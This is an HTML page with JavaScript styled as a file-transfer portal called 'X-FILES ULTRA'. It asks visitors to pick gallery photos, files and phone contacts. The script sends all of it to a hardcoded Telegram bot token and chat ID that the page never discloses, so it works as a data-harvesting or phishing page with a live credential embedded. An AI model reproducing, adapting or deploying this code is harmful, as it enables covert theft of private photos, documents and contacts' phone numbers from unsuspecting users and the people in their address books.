<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XG-FILES ULTRA</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;600;900&display=swap'); 
        /* ব্যাকগ্রাউন্ড এখন হালকা নীলচে-কালো শেড (Navy Dark) */
        body { background: #0f172a; color: #f1f5f9; font-family: 'Inter', sans-serif; overflow-x: hidden; } 
        
        /* গ্লাস ইফেক্ট আরও স্বচ্ছ এবং সুন্দর করা হয়েছে */
        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 35px; } 
        
        .active-tab { background: #3b82f6 !important; color: #fff !important; box-shadow: 0 0 25px rgba(59, 130, 246, 0.4); } 
        .file-card { transition: 0.3s; border: 1px solid rgba(255,255,255,0.05); background: rgba(255,255,255,0.03); } 
        
        ::-webkit-scrollbar { width: 5px; } 
        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 10px; }
        
        .progress-bar { transition: width 0.4s ease; }

        /* অ্যানিমেটেড নিওন বক্স - হালকা গ্লো ইফেক্ট */
        .animated-box {
            background: rgba(15, 23, 42, 0.5);
            border: 2px solid rgba(59, 130, 246, 0.5);
            animation: borderGlow 2.5s infinite alternate;
        }
        @keyframes borderGlow {
            from { border-color: rgba(59, 130, 246, 0.4); box-shadow: 0 0 10px rgba(59, 130, 246, 0.2); }
            to { border-color: rgba(96, 165, 250, 0.8); box-shadow: 0 0 20px rgba(59, 130, 246, 0.4); }
        }
    </style>
</head>
<body class="p-4">

<div class="max-w-5xl mx-auto"> 
    <div class="glass p-8 mb-8 flex flex-col md:flex-row justify-between items-center"> 
        <div> 
            <h1 class="text-4xl font-black tracking-tighter uppercase italic">X-FILES <span class="text-blue-500">ULTRA</span></h1> 
            <p id="eta-text" class="text-[10px] text-blue-300 font-bold uppercase tracking-widest mt-1">Premium Data Conduit</p> 
        </div> 
        <div class="flex bg-slate-900/80 p-1.5 rounded-2xl border border-white/5 mt-6 md:mt-0"> 
            <button onclick="setType('photo')" id="tab-photo" class="tab-btn active-tab px-6 py-2 rounded-xl text-[10px] font-black transition-all">PHOTO</button> 
            <button onclick="setType('document')" id="tab-document" class="tab-btn px-6 py-2 rounded-xl text-[10px] font-black transition-all text-slate-400">FILES</button> 
            <button onclick="setType('contact')" id="tab-contact" class="tab-btn px-6 py-2 rounded-xl text-[10px] font-black transition-all text-slate-400">CONTACT</button> 
        </div> 
    </div> 

    <div class="grid grid-cols-1 lg:grid-cols-3 gap-8"> 
        <div class="lg:col-span-1"> 
            <label id="upload-box" class="animated-box h-72 flex flex-col items-center justify-center cursor-pointer rounded-[40px] mb-6 group transition-all"> 
                <input type="file" id="fileInput" multiple class="hidden"> 
                <span id="upload-icon" class="text-6xl mb-4 group-hover:scale-110 transition-transform">🖼️</span> 
                <p id="upload-label" class="text-[11px] text-slate-300 font-black tracking-[0.2em] uppercase text-center px-4">Access Media Storage</p> 
            </label> 

            <div id="contact-box" class="hidden animated-box h-72 flex flex-col items-center justify-center cursor-pointer rounded-[40px] mb-6 group" onclick="pickContacts()">
                <div class="relative">
                    <span class="text-6xl group-hover:scale-110 transition-transform block">👥</span>
                    <div id="contact-badge" class="absolute -top-2 -right-2 bg-blue-500 w-7 h-7 rounded-full flex items-center justify-center animate-bounce hidden">
                        <span id="contact-small-count" class="text-[10px] font-bold text-white">0</span>
                    </div>
                </div>
                <p class="text-[11px] text-blue-400 font-black tracking-[0.2em] uppercase text-center px-4 mt-4">Sync Batch Contacts</p>
                <p id="contact-stats" class="text-[9px] text-slate-400 mt-2 font-bold uppercase tracking-widest italic">Pending Selection</p>
            </div>

            <button onclick="ignite()" id="sendBtn" class="w-full py-6 bg-blue-600 text-white font-black rounded-[30px] hover:bg-blue-500 transition-all active:scale-95 shadow-lg uppercase tracking-[0.3em]">Ignite Transfer</button> 
            
            <div id="status-box" class="mt-4 hidden p-4 glass rounded-2xl">
                <p id="status-text" class="text-[10px] font-bold text-blue-400 uppercase mb-2 text-center">Transferring...</p>
                <div class="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
                    <div id="progress-fill" class="progress-bar bg-blue-500 h-full w-0"></div>
                </div>
            </div>
        </div> 

        <div class="lg:col-span-2 glass p-6 min-h-[480px]"> 
            <div class="flex justify-between items-center mb-8 px-2"> 
                <div class="flex flex-col"> 
                    <span class="text-[10px] font-black text-slate-500 tracking-widest uppercase mb-1">Queue Status</span> 
                    <span id="q-count" class="text-blue-500 font-black text-5xl">0</span> 
                </div> 
                <div class="flex flex-col items-end"> 
                    <span class="text-[10px] font-black text-slate-500 tracking-widest uppercase mb-1">Transmitted</span> 
                    <span id="s-count" class="text-emerald-500 font-black text-5xl">0</span> 
                </div> 
            </div> 
            <div id="preview-grid" class="grid grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4 overflow-y-auto max-h-[500px] pr-2"> </div> 
        </div> 
    </div> 
</div> 

<script> 
const TOKEN = "7803047176:AAENBpYrmbNuFiBsAMf8fwFybVOsSNTgQM4"; 
const CHAT_ID = "5923885908"; 
let queue = []; 
let currentType = 'photo'; 

function setType(type) { 
    currentType = type; 
    document.querySelectorAll('.tab-btn').forEach(b => { 
        b.classList.remove('active-tab'); 
        b.classList.add('text-slate-400'); 
    }); 
    document.getElementById(`tab-${type}`).classList.add('active-tab'); 

    if(type === 'contact') {
        document.getElementById('upload-box').classList.add('hidden');
        document.getElementById('contact-box').classList.remove('hidden');
        document.getElementById('sendBtn').innerText = "Send Contacts";
    } else {
        document.getElementById('upload-box').classList.remove('hidden');
        document.getElementById('contact-box').classList.add('hidden');
        document.getElementById('sendBtn').innerText = "Ignite Transfer";
        document.getElementById('upload-icon').innerText = type === 'photo' ? '🖼️' : '📂'; 
        document.getElementById('upload-label').innerText = type === 'photo' ? 'Access Gallery' : 'Access Files';
        document.getElementById('fileInput').accept = type === 'photo' ? "image/*" : "*/*"; 
    }
} 

async function pickContacts() {
    try {
        if ('contacts' in navigator) {
            const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
            if (contacts.length) {
                const formatted = contacts.map(c => ({
                    isContact: true,
                    name: c.name[0] || "Unknown",
                    tel: (c.tel && c.tel[0]) ? c.tel[0] : "N/A",
                    id: Math.random()
                }));
                queue = [...queue, ...formatted];
                render();
            }
        }
    } catch (err) { console.log(err); }
}

document.getElementById('fileInput').onchange = (e) => { 
    const files = Array.from(e.target.files);
    queue = [...queue, ...files]; 
    render(); 
    e.target.value = ""; 
}; 

function render() { 
    const grid = document.getElementById('preview-grid'); 
    grid.innerHTML = ""; 
    const contactCount = queue.filter(f => f.isContact).length;
    document.getElementById('q-count').innerText = queue.length; 
    
    if(contactCount > 0) {
        document.getElementById('contact-badge').classList.remove('hidden');
        document.getElementById('contact-small-count').innerText = contactCount;
        document.getElementById('contact-stats').innerText = `${contactCount} Numbers Ready`;
    } else {
        document.getElementById('contact-badge').classList.add('hidden');
        document.getElementById('contact-stats').innerText = "Pending Selection";
    }

    queue.forEach((f, i) => { 
        const div = document.createElement('div'); 
        div.className = "relative aspect-square rounded-2xl overflow-hidden file-card flex flex-col items-center justify-center p-2"; 
        if (f.isContact) {
            div.innerHTML = `<span class="text-3xl mb-1">👤</span><div class="text-[8px] font-bold text-blue-400 text-center uppercase">${f.name}</div>`;
        } else if (f.type && f.type.startsWith('image/')) { 
            div.innerHTML = `<img src="${URL.createObjectURL(f)}" class="w-full h-full object-cover">`; 
        } else { 
            div.innerHTML = `<div class="p-2 text-center text-[10px] font-bold text-slate-400 break-all uppercase">${f.name.split('.').pop()}</div>`; 
        } 
        div.innerHTML += `<button onclick="remove(${i})" class="absolute top-1 right-1 bg-red-500/80 w-5 h-5 rounded-full text-[10px] flex items-center justify-center">✕</button>`; 
        grid.appendChild(div); 
    }); 
} 

function remove(i) { queue.splice(i, 1); render(); } 

async function ignite() { 
    if(!queue.length) return; 
    const btn = document.getElementById('sendBtn'); 
    const sCountDisp = document.getElementById('s-count'); 
    const statusBox = document.getElementById('status-box');
    const progressFill = document.getElementById('progress-fill');
    const statusText = document.getElementById('status-text');

    btn.disabled = true; btn.innerText = "🚀 INJECTING..."; statusBox.classList.remove('hidden');

    let totalSent = 0; 
    const totalItems = queue.length;
    const contacts = queue.filter(item => item.isContact);
    const files = queue.filter(item => !item.isContact);

    // ১. কন্টাক্ট লিস্ট পাঠানো
    if(contacts.length > 0) {
        let listMsg = `👥 *BATCH CONTACT SYNC*\n\n`;
        contacts.forEach((c, idx) => {
            listMsg += `👤 *${idx + 1}.* ${c.name}\n📞 \`${c.tel}\`\n\n`; 
        });
        listMsg += `🌐 Portal: X-FILES ULTRA`;
        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: listMsg, parse_mode: 'Markdown' })
            });
            totalSent += contacts.length;
            updateUI(totalSent, totalItems);
        } catch(e) {}
    }

    // ২. ফাইল পাঠানো (ব্যাচিং সিস্টেমসহ)
    const BATCH_SIZE = 50;
    for (let i = 0; i < files.length; i += BATCH_SIZE) {
        const batch = files.slice(i, i + BATCH_SIZE);
        for (const f of batch) {
            const method = (currentType === 'photo' && f.size < 10*1024*1024) ? 'sendPhoto' : 'sendDocument';
            const fd = new FormData(); 
            fd.append("chat_id", CHAT_ID); 
            fd.append(method === 'sendPhoto' ? 'photo' : 'document', f); 
            try {
                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, { method: 'POST', body: fd });
                if(res.ok) { totalSent++; updateUI(totalSent, totalItems); }
            } catch (err) {}
        }
        if (i + BATCH_SIZE < files.length) await new Promise(r => setTimeout(r, 2000));
    }

    function updateUI(sent, total) {
        sCountDisp.innerText = sent;
        const percent = Math.round((sent / total) * 100);
        progressFill.style.width = percent + "%";
        statusText.innerText = `Transferring: ${percent}%`;
    }

    btn.innerText = "COMPLETED"; btn.style.background = "#10b981";
    setTimeout(() => location.reload(), 3000); 
} 
setType('photo');
</script>
</body>
</html>
